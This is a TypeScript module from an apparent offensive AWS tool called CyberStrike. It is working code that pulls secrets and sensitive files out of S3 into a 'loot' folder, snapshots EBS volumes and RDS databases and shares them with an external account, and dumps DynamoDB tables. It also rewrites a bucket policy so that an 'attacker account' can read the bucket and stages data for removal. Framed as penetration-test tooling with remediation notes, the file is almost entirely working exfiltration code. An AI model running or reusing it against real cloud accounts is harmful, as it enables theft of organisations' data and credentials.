import { aws, argVal, hasFlag, tryJson } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function s3Dump(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const bucket = argVal(args, "--bucket")
  const pattern = argVal(args, "--pattern")
  const download = hasFlag(args, "--download")
  const sensitivePattern = pattern || "\\.(env|pem|key|p12|pfx|sql|bak)$|credentials|secret|password|backup|id_rsa"

  if (bucket) {
    const r = await aws(["s3", "ls", `s3://${bucket}`, "--recursive"], profile, region, timeout)
    if (r.exitCode !== 0) return { output: `[-] Cannot list bucket ${bucket}: ${r.stderr.trim()}`, findings: [] }
    const files = r.stdout.split("\n").filter((f) => new RegExp(sensitivePattern, "i").test(f))
    const output = [`[*] Scanning bucket: ${bucket}`, `[+] Sensitive files: ${files.length}`]
    for (const f of files) output.push(`    ${f.trim()}`)
    if (download && files.length > 0) {
      for (const f of files.slice(0, 10)) {
        const key = f.trim().split(/\s+/).pop() || ""
        const dl = await aws(["s3", "cp", `s3://${bucket}/${key}`, "./s3_loot/"], profile, region, timeout)
        output.push(dl.exitCode === 0 ? `    Downloaded: ${key}` : `    Failed: ${key}`)
      }
    }
    return { output: output.join("\n"), findings: [] }
  }

  const r = await aws(["s3api", "list-buckets", "--query", "Buckets[].Name"], profile, region, timeout)
  if (r.exitCode !== 0) return { output: `[-] Cannot list buckets: ${r.stderr.trim()}`, findings: [] }
  const buckets = tryJson(r.stdout) || []
  const output = [`[*] Found ${buckets.length} bucket(s)\n`]

  for (const b of buckets) {
    const lr = await aws(["s3", "ls", `s3://${b}`, "--recursive"], profile, region, timeout)
    if (lr.exitCode !== 0) {
      output.push(`[-] ${b}: access denied`)
      continue
    }
    const files = lr.stdout.split("\n").filter((f) => new RegExp(sensitivePattern, "i").test(f))
    output.push(`[${files.length > 0 ? "!" : "+"}] ${b}: ${files.length} sensitive file(s)`)
    for (const f of files.slice(0, 5)) output.push(`    ${f.trim()}`)
  }

  return { output: output.join("\n"), findings: [] }
}

export async function ec2Snapshot(args: string[], timeout: number): Promise<HookResult> {
  const volumeId = argVal(args, "--volume-id")
  const shareAccount = argVal(args, "--share-account")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")

  if (!volumeId) return { output: "ERROR: --volume-id required", findings: [] }

  const r = await aws(
    [
      "ec2",
      "create-snapshot",
      "--volume-id",
      volumeId,
      "--description",
      "CyberStrike forensic snapshot",
      "--tag-specifications",
      "ResourceType=snapshot,Tags=[{Key=CreatedBy,Value=CyberStrike}]",
    ],
    profile,
    region,
    timeout,
  )
  if (r.exitCode !== 0) return { output: `[-] Snapshot failed: ${r.stderr.trim()}`, findings: [] }
  const snap = tryJson(r.stdout)
  const output = [`[+] Snapshot created: ${snap?.SnapshotId}`, `    Volume: ${volumeId}`, `    State: ${snap?.State}`]

  if (shareAccount) {
    const sr = await aws(
      [
        "ec2",
        "modify-snapshot-attribute",
        "--snapshot-id",
        snap?.SnapshotId,
        "--attribute",
        "createVolumePermission",
        "--operation-type",
        "add",
        "--user-ids",
        shareAccount,
      ],
      profile,
      region,
      timeout,
    )
    output.push(
      sr.exitCode === 0 ? `[+] Shared with account: ${shareAccount}` : `[-] Sharing failed: ${sr.stderr.trim()}`,
    )
  }

  return { output: output.join("\n"), findings: [] }
}

export async function rdsDump(args: string[], timeout: number): Promise<HookResult> {
  const dbId = argVal(args, "--db-identifier")
  const shareAccount = argVal(args, "--share-account")
  const restore = hasFlag(args, "--restore")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const findings: Finding[] = []

  if (!dbId) {
    const r = await aws(
      [
        "rds",
        "describe-db-instances",
        "--query",
        "DBInstances[].[DBInstanceIdentifier,Engine,DBInstanceStatus,Endpoint.Address]",
      ],
      profile,
      region,
      timeout,
    )
    if (r.exitCode !== 0) return { output: `[-] Cannot list RDS instances: ${r.stderr.trim()}`, findings }
    const dbs = tryJson(r.stdout) || []
    const output = [`[*] RDS Instances: ${dbs.length}\n`]
    for (const db of dbs) output.push(`    ${db[0]} (${db[1]}) — ${db[2]} — ${db[3] || "no endpoint"}`)
    output.push("\n[*] Use --db-identifier to create a snapshot")
    return { output: output.join("\n"), findings }
  }

  const output = [`[*] RDS Snapshot — target: ${dbId}\n`]
  const snapId = `cs-snap-${Date.now()}`
  const r = await aws(
    [
      "rds",
      "create-db-snapshot",
      "--db-instance-identifier",
      dbId,
      "--db-snapshot-identifier",
      snapId,
      "--tags",
      "Key=CreatedBy,Value=CyberStrike",
    ],
    profile,
    region,
    timeout,
  )
  if (r.exitCode !== 0) return { output: `[-] Snapshot failed: ${r.stderr.trim()}`, findings }

  output.push(`[+] Snapshot created: ${snapId}`)
  output.push(`[*] Waiting for snapshot to become available...`)

  const wait = await aws(
    ["rds", "wait", "db-snapshot-available", "--db-snapshot-identifier", snapId],
    profile,
    region,
    timeout,
  )
  if (wait.exitCode === 0) output.push(`[+] Snapshot available`)

  findings.push({
    checkId: "AWS-RDS-001",
    provider: "aws",
    severity: "critical",
    status: "EXTRACTED",
    resource: `rds:${dbId}`,
    title: `RDS snapshot created: ${snapId}`,
    details: `Snapshot of ${dbId} created for data extraction`,
    remediation: "Delete snapshot after engagement: aws rds delete-db-snapshot",
  })

  if (shareAccount) {
    const sr = await aws(
      [
        "rds",
        "modify-db-snapshot-attribute",
        "--db-snapshot-identifier",
        snapId,
        "--attribute-name",
        "restore",
        "--values-to-add",
        shareAccount,
      ],
      profile,
      region,
      timeout,
    )
    if (sr.exitCode === 0) {
      output.push(`[+] Snapshot shared with account: ${shareAccount}`)
      findings.push({
        checkId: "AWS-RDS-002",
        provider: "aws",
        severity: "critical",
        status: "SHARED",
        resource: `rds:${snapId}`,
        title: `RDS snapshot shared cross-account: ${shareAccount}`,
        details: `Snapshot ${snapId} shared with AWS account ${shareAccount}`,
        remediation: "Revoke sharing after extraction",
      })
    } else {
      output.push(`[-] Sharing failed: ${sr.stderr.trim()}`)
    }
  }

  if (restore) {
    const restoreId = `cs-restore-${Date.now()}`
    const rr = await aws(
      [
        "rds",
        "restore-db-instance-from-db-snapshot",
        "--db-instance-identifier",
        restoreId,
        "--db-snapshot-identifier",
        snapId,
        "--db-instance-class",
        "db.t3.micro",
        "--tags",
        "Key=CreatedBy,Value=CyberStrike",
      ],
      profile,
      region,
      timeout,
    )
    if (rr.exitCode === 0) {
      output.push(`[+] Restoring snapshot to instance: ${restoreId}`)
      output.push(`[*] Wait for instance, then connect and extract data`)
    } else {
      output.push(`[-] Restore failed: ${rr.stderr.trim()}`)
    }
  }

  return { output: output.join("\n"), findings }
}

export async function dynamodbDump(args: string[], timeout: number): Promise<HookResult> {
  const tableName = argVal(args, "--table-name")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const limit = argVal(args, "--limit") || "100"
  const output: string[] = ["[*] DynamoDB Data Extraction\n"]
  const findings: Finding[] = []

  if (!tableName) {
    const tables = await aws(["dynamodb", "list-tables", "--query", "TableNames"], profile, region, timeout)
    if (tables.exitCode !== 0) return { output: `[-] Cannot list tables: ${tables.stderr.trim()}`, findings }
    const tl = tryJson(tables.stdout) || []
    output.push(`[+] DynamoDB Tables: ${tl.length}\n`)

    for (const t of tl) {
      const desc = await aws(
        ["dynamodb", "describe-table", "--table-name", t, "--query", "Table.[TableName,ItemCount,TableSizeBytes,TableStatus,SSEDescription.Status]"],
        profile,
        region,
        timeout,
      )
      if (desc.exitCode === 0) {
        const d = tryJson(desc.stdout)
        const sizeKb = Math.round((d?.[2] || 0) / 1024)
        output.push(`    ${d?.[0]} — ${d?.[1]} items — ${sizeKb}KB — ${d?.[3]}${d?.[4] === "ENABLED" ? "" : " [NO SSE]"}`)
      }
    }
    output.push("\n[*] Use --table-name TABLE to scan/dump data")
    return { output: output.join("\n"), findings }
  }

  output.push(`[*] Scanning table: ${tableName} (limit: ${limit})\n`)

  const scan = await aws(
    ["dynamodb", "scan", "--table-name", tableName, "--max-items", limit, "--output", "json"],
    profile,
    region,
    timeout,
  )
  if (scan.exitCode !== 0) {
    output.push(`[-] Scan failed: ${scan.stderr.trim()}`)
    return { output: output.join("\n"), findings }
  }

  const result = tryJson(scan.stdout)
  const items = result?.Items || []
  const count = result?.Count || 0
  const scannedCount = result?.ScannedCount || 0

  output.push(`[+] Items returned: ${count} (scanned: ${scannedCount})`)

  for (const item of items.slice(0, 20)) {
    const flat = Object.entries(item)
      .map(([k, v]) => {
        const val = v as Record<string, string>
        return `${k}=${val.S || val.N || val.BOOL || "[complex]"}`
      })
      .join(", ")
    output.push(`    ${flat.slice(0, 120)}${flat.length > 120 ? "..." : ""}`)
  }

  if (count > 20) output.push(`    ... and ${count - 20} more items`)

  const secrets = JSON.stringify(items).match(/(password|secret|key|token|api_key|private_key)/gi) || []
  if (secrets.length > 0) {
    output.push(`\n    [!] Potential secrets found: ${[...new Set(secrets)].join(", ")}`)
    findings.push({
      checkId: "AWS-EXFIL-001",
      provider: "aws",
      severity: "critical",
      status: "EXTRACTED",
      resource: `dynamodb:${tableName}`,
      title: `DynamoDB data with secrets: ${tableName}`,
      details: `${count} items extracted, potential secrets: ${[...new Set(secrets)].join(",")}`,
      remediation: "Review table data for sensitive information, enable SSE",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function ebsDirectRead(args: string[], timeout: number): Promise<HookResult> {
  const snapshotId = argVal(args, "--snapshot-id")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] EBS Direct API Snapshot Read\n"]
  const findings: Finding[] = []

  if (!snapshotId) {
    const snaps = await aws(
      [
        "ec2",
        "describe-snapshots",
        "--owner-ids",
        "self",
        "--query",
        "Snapshots[].[SnapshotId,VolumeId,VolumeSize,State,Description]",
        "--max-items",
        "50",
      ],
      profile,
      region,
      timeout,
    )
    if (snaps.exitCode === 0) {
      const sl = tryJson(snaps.stdout) || []
      output.push(`[+] Available Snapshots: ${sl.length}`)
      for (const s of sl) output.push(`    ${s[0]} — vol: ${s[1]} — ${s[2]}GB — ${s[3]} — ${s[4] || ""}`)
    }
    output.push("\n[*] Use --snapshot-id to read snapshot blocks via EBS Direct API")
    output.push("[*] EBS Direct API reads block-level data without mounting (no EC2 needed)")
    return { output: output.join("\n"), findings }
  }

  const blocks = await aws(
    ["ebs", "list-snapshot-blocks", "--snapshot-id", snapshotId, "--max-results", "100"],
    profile,
    region,
    timeout,
  )
  if (blocks.exitCode !== 0) {
    output.push(`[-] Cannot list blocks: ${blocks.stderr.trim()}`)
    output.push("[*] EBS Direct API may require specific permissions: ebs:ListSnapshotBlocks, ebs:GetSnapshotBlock")
    return { output: output.join("\n"), findings }
  }

  const result = tryJson(blocks.stdout)
  const blockList = result?.Blocks || []
  const volumeSize = result?.VolumeSize
  const blockSize = result?.BlockSize

  output.push(`[+] Snapshot: ${snapshotId}`)
  output.push(`    Volume size: ${volumeSize}GB, Block size: ${blockSize} bytes`)
  output.push(`    Blocks (first 100): ${blockList.length}`)

  findings.push({
    checkId: "AWS-EXFIL-002",
    provider: "aws",
    severity: "high",
    status: "ACCESSED",
    resource: `ebs:${snapshotId}`,
    title: `EBS snapshot blocks listed: ${snapshotId}`,
    details: `${blockList.length} blocks accessible, ${volumeSize}GB volume`,
    remediation: "Review ebs:ListSnapshotBlocks and ebs:GetSnapshotBlock permissions",
  })

  output.push(`\n[*] To read block data: aws ebs get-snapshot-block --snapshot-id ${snapshotId} --block-index <INDEX> --block-token <TOKEN>`)
  output.push("[*] Block data can be reassembled into a raw disk image for offline analysis")

  return { output: output.join("\n"), findings }
}

export async function s3Exfil(args: string[], timeout: number): Promise<HookResult> {
  const bucket = argVal(args, "--bucket")
  const externalAccount = argVal(args, "--external-account")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] S3 Bucket Policy Exfiltration\n"]
  const findings: Finding[] = []

  if (!bucket) return { output: "ERROR: --bucket required", findings }
  if (!externalAccount) return { output: "ERROR: --external-account required (attacker account ID)", findings }

  const existing = await aws(["s3api", "get-bucket-policy", "--bucket", bucket], profile, region, timeout)
  let doc: Record<string, unknown> = { Version: "2012-10-17", Statement: [] }
  if (existing.exitCode === 0) {
    doc = tryJson(tryJson(existing.stdout)?.Policy || "{}") || doc
  }

  output.push(`[*] Current policy: ${(doc.Statement as unknown[])?.length || 0} statement(s)`)

  const newStatement = {
    Sid: "CyberStrikeExfil",
    Effect: "Allow",
    Principal: { AWS: `arn:aws:iam::${externalAccount}:root` },
    Action: ["s3:GetObject", "s3:ListBucket"],
    Resource: [`arn:aws:s3:::${bucket}`, `arn:aws:s3:::${bucket}/*`],
  }

  ;(doc.Statement as unknown[]).push(newStatement)

  const put = await aws(
    ["s3api", "put-bucket-policy", "--bucket", bucket, "--policy", JSON.stringify(doc)],
    profile,
    region,
    timeout,
  )

  if (put.exitCode === 0) {
    output.push(`\n[+] Bucket policy modified — external account ${externalAccount} granted read access`)
    output.push(`\n[*] From attacker account:`)
    output.push(`    aws s3 ls s3://${bucket} --recursive`)
    output.push(`    aws s3 sync s3://${bucket} ./loot/`)
    findings.push({
      checkId: "AWS-EXFIL-003",
      provider: "aws",
      severity: "critical",
      status: "MODIFIED",
      resource: `s3:${bucket}`,
      title: `S3 bucket policy modified for exfil: ${bucket}`,
      details: `External account ${externalAccount} granted s3:GetObject and s3:ListBucket`,
      remediation: "Remove CyberStrikeExfil statement from bucket policy",
    })
  } else {
    output.push(`[-] Policy modification failed: ${put.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

export async function dataStage(args: string[], timeout: number): Promise<HookResult> {
  const sourcePath = argVal(args, "--source")
  const destBucket = argVal(args, "--dest-bucket")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const compress = !hasFlag(args, "--no-compress")
  const output: string[] = ["[*] Data Staging\n"]
  const findings: Finding[] = []

  if (!sourcePath) return { output: "ERROR: --source required (local path or s3://)", findings }
  if (!destBucket) return { output: "ERROR: --dest-bucket required (staging bucket)", findings }

  if (sourcePath.startsWith("s3://")) {
    output.push(`[*] Source: ${sourcePath} (S3)`)
    output.push(`[*] Destination: s3://${destBucket}/staged/`)

    const r = await aws(
      ["s3", "sync", sourcePath, `s3://${destBucket}/staged/`, "--quiet"],
      profile,
      region,
      timeout,
    )
    if (r.exitCode === 0) {
      output.push(`[+] Data staged to s3://${destBucket}/staged/`)
    } else {
      output.push(`[-] Staging failed: ${r.stderr.trim()}`)
    }
  } else {
    output.push(`[*] Source: ${sourcePath} (local)`)

    if (compress) {
      const archiveName = `staged-${Date.now()}.tar.gz`
      output.push(`[*] Compressing to ${archiveName}...`)

      const { run } = await import("./shared")
      const tar = await run("tar", ["-czf", archiveName, sourcePath], timeout)
      if (tar.exitCode !== 0) {
        output.push(`[-] Compression failed: ${tar.stderr.trim()}`)
        return { output: output.join("\n"), findings }
      }

      const upload = await aws(
        ["s3", "cp", archiveName, `s3://${destBucket}/staged/${archiveName}`],
        profile,
        region,
        timeout,
      )
      if (upload.exitCode === 0) {
        output.push(`[+] Staged: s3://${destBucket}/staged/${archiveName}`)
      } else {
        output.push(`[-] Upload failed: ${upload.stderr.trim()}`)
      }
    } else {
      const upload = await aws(
        ["s3", "sync", sourcePath, `s3://${destBucket}/staged/`, "--quiet"],
        profile,
        region,
        timeout,
      )
      if (upload.exitCode === 0) {
        output.push(`[+] Data staged to s3://${destBucket}/staged/`)
      } else {
        output.push(`[-] Staging failed: ${upload.stderr.trim()}`)
      }
    }
  }

  findings.push({
    checkId: "AWS-EXFIL-004",
    provider: "aws",
    severity: "critical",
    status: "STAGED",
    resource: `s3:${destBucket}`,
    title: `Data staged to: ${destBucket}`,
    details: `Data from ${sourcePath} staged to s3://${destBucket}/staged/`,
    remediation: "Delete staged data and review bucket access logs",
  })

  return { output: output.join("\n"), findings }
}

export async function cleanupAws(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const dryRun = hasFlag(args, "--dry-run")
  const mode = dryRun ? "DRY RUN" : "LIVE"
  const output = [`[*] CyberStrike AWS cleanup — ${mode}\n`]

  const snaps = await aws(
    [
      "ec2",
      "describe-snapshots",
      "--owner-ids",
      "self",
      "--filters",
      "Name=tag:CreatedBy,Values=CyberStrike",
      "--query",
      "Snapshots[].SnapshotId",
    ],
    profile,
    region,
    timeout,
  )
  if (snaps.exitCode === 0) {
    const snapList = tryJson(snaps.stdout) || []
    output.push(`[+] Snapshots to clean: ${snapList.length}`)
    for (const s of snapList) {
      if (dryRun) {
        output.push(`    Would delete: ${s}`)
      } else {
        await aws(["ec2", "delete-snapshot", "--snapshot-id", s], profile, region, timeout)
        output.push(`    Deleted: ${s}`)
      }
    }
  }

  const rdsSnaps = await aws(
    [
      "rds",
      "describe-db-snapshots",
      "--query",
      "DBSnapshots[?contains(DBSnapshotIdentifier,'cs-snap-')].[DBSnapshotIdentifier]",
    ],
    profile,
    region,
    timeout,
  )
  if (rdsSnaps.exitCode === 0) {
    const rdsList = tryJson(rdsSnaps.stdout) || []
    output.push(`[+] RDS snapshots to clean: ${rdsList.length}`)
    for (const s of rdsList) {
      const snapId = s[0]
      if (dryRun) {
        output.push(`    Would delete: ${snapId}`)
      } else {
        await aws(["rds", "delete-db-snapshot", "--db-snapshot-identifier", snapId], profile, region, timeout)
        output.push(`    Deleted: ${snapId}`)
      }
    }
  }

  const lambdas = await aws(
    [
      "lambda",
      "list-functions",
      "--query",
      "Functions[?contains(FunctionName,'cs-')].[FunctionName]",
    ],
    profile,
    region,
    timeout,
  )
  if (lambdas.exitCode === 0) {
    const ll = tryJson(lambdas.stdout) || []
    output.push(`[+] Lambda functions to clean: ${ll.length}`)
    for (const l of ll) {
      if (dryRun) {
        output.push(`    Would delete: ${l[0]}`)
      } else {
        await aws(["lambda", "delete-function", "--function-name", l[0]], profile, region, timeout)
        output.push(`    Deleted: ${l[0]}`)
      }
    }
  }

  const users = await aws(
    [
      "iam",
      "list-users",
      "--query",
      "Users[?contains(UserName,'cs-')].[UserName]",
    ],
    profile,
    region,
    timeout,
  )
  if (users.exitCode === 0) {
    const ul = tryJson(users.stdout) || []
    output.push(`[+] IAM users to clean: ${ul.length}`)
    for (const u of ul) {
      if (dryRun) {
        output.push(`    Would delete: ${u[0]}`)
      } else {
        const keys = await aws(["iam", "list-access-keys", "--user-name", u[0], "--query", "AccessKeyMetadata[].AccessKeyId"], profile, region, timeout)
        for (const k of tryJson(keys.stdout) || []) {
          await aws(["iam", "delete-access-key", "--user-name", u[0], "--access-key-id", k], profile, region, timeout)
        }
        await aws(["iam", "delete-login-profile", "--user-name", u[0]], profile, region, timeout)
        const policies = await aws(["iam", "list-attached-user-policies", "--user-name", u[0], "--query", "AttachedPolicies[].PolicyArn"], profile, region, timeout)
        for (const p of tryJson(policies.stdout) || []) {
          await aws(["iam", "detach-user-policy", "--user-name", u[0], "--policy-arn", p], profile, region, timeout)
        }
        await aws(["iam", "delete-user", "--user-name", u[0]], profile, region, timeout)
        output.push(`    Deleted: ${u[0]}`)
      }
    }
  }

  const roles = await aws(
    [
      "iam",
      "list-roles",
      "--query",
      "Roles[?contains(RoleName,'cs-')].[RoleName]",
    ],
    profile,
    region,
    timeout,
  )
  if (roles.exitCode === 0) {
    const rl = tryJson(roles.stdout) || []
    output.push(`[+] IAM roles to clean: ${rl.length}`)
    for (const r of rl) {
      if (dryRun) {
        output.push(`    Would delete: ${r[0]}`)
      } else {
        const policies = await aws(["iam", "list-attached-role-policies", "--role-name", r[0], "--query", "AttachedPolicies[].PolicyArn"], profile, region, timeout)
        for (const p of tryJson(policies.stdout) || []) {
          await aws(["iam", "detach-role-policy", "--role-name", r[0], "--policy-arn", p], profile, region, timeout)
        }
        await aws(["iam", "delete-role", "--role-name", r[0]], profile, region, timeout)
        output.push(`    Deleted: ${r[0]}`)
      }
    }
  }

  const cfnStacks = await aws(
    [
      "cloudformation",
      "list-stacks",
      "--stack-status-filter",
      "CREATE_COMPLETE",
      "UPDATE_COMPLETE",
      "--query",
      "StackSummaries[?contains(StackName,'cs-')].[StackName]",
    ],
    profile,
    region,
    timeout,
  )
  if (cfnStacks.exitCode === 0) {
    const sl = tryJson(cfnStacks.stdout) || []
    output.push(`[+] CloudFormation stacks to clean: ${sl.length}`)
    for (const s of sl) {
      if (dryRun) {
        output.push(`    Would delete: ${s[0]}`)
      } else {
        await aws(["cloudformation", "delete-stack", "--stack-name", s[0]], profile, region, timeout)
        output.push(`    Deleting: ${s[0]}`)
      }
    }
  }

  const events = await aws(
    [
      "events",
      "list-rules",
      "--query",
      "Rules[?contains(Name,'cs-')].[Name]",
    ],
    profile,
    region,
    timeout,
  )
  if (events.exitCode === 0) {
    const el = tryJson(events.stdout) || []
    output.push(`[+] EventBridge rules to clean: ${el.length}`)
    for (const e of el) {
      if (dryRun) {
        output.push(`    Would delete: ${e[0]}`)
      } else {
        const targets = await aws(["events", "list-targets-by-rule", "--rule", e[0], "--query", "Targets[].Id"], profile, region, timeout)
        const tl = tryJson(targets.stdout) || []
        if (tl.length > 0) {
          await aws(["events", "remove-targets", "--rule", e[0], "--ids", ...tl], profile, region, timeout)
        }
        await aws(["events", "delete-rule", "--name", e[0]], profile, region, timeout)
        output.push(`    Deleted: ${e[0]}`)
      }
    }
  }

  const trails = await aws(["cloudtrail", "describe-trails", "--query", "trailList[].[Name]"], profile, region, timeout)
  if (trails.exitCode === 0) {
    for (const t of tryJson(trails.stdout) || []) {
      const status = await aws(["cloudtrail", "get-trail-status", "--name", t[0]], profile, region, timeout)
      const s = tryJson(status.stdout)
      if (!s?.IsLogging) {
        if (dryRun) {
          output.push(`    Would restart logging: ${t[0]}`)
        } else {
          await aws(["cloudtrail", "start-logging", "--name", t[0]], profile, region, timeout)
          output.push(`[+] Restarted logging: ${t[0]}`)
        }
      }
    }
  }

  output.push(`\n[*] Cleanup ${mode} complete`)
  return { output: output.join("\n"), findings: [] }
}
